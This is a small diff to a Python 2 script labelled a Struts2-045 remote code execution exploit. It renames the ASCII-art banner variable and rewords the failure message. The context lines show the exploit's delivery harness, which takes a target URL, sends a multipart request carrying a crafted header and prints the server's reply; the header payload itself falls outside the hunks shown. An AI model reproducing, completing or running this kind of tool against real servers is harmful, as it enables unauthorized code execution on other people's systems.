@@ -2,7 +2,7 @@
 #-*- coding:utf-8 -*-
 #Strutrs2-045 RCE exp
 __author__ = '@S4kur4'
-name = "   _____ _              _       ___  \n"\
+logo = "   _____ _              _       ___  \n"\
        "  / ____| |            | |     |__ \ \n"\
        " | (___ | |_ _ __ _   _| |_ ___   ) |\n"\
        "  \___ \| __| '__| | | | __/ __| / / \n"\
@@ -28,7 +28,7 @@ header1 = {
 def main():
     register_openers()
     datagen, header2 = multipart_encode({"image1": open("tmp.txt", "rb")})
-    print name
+    print logo
     parser = optparse.OptionParser('usage: %prog [options]')
     parser.add_option('-u', '--url', dest='target_url', type='string', help='specify target URL')
     (options, args) = parser.parse_args()
@@ -46,7 +46,7 @@ def main():
     	response = urllib2.urlopen(request)
     	print response.read()
     except Exception, e:
-    	print "\033[1;31mUnsuccessful,maybe no vulnerable.\033[0m"
+    	print "\033[1;31m[-] Unsuccessful,maybe invulnerable.\033[0m"
 
 if __name__ == '__main__':
     main()
